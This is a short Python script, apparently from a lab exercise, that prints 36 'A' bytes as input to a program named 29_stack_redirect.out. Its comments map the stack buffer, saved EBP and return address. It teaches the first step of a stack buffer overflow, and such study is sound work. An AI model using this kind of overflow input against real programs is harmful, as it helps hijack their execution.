#!/usr/bin/python3
import sys

# generate the input for 29_stack_redirect.out to redirect execution
# our buffer starts at EBP-0x1c (28 bytes below)
# bytes 29-32 are EBP
# bytes 33-36 are the RET address (EBP+0x4)

# write out 36 A's to the terminal
sys.stdout.buffer.write(b'A' * 36 )
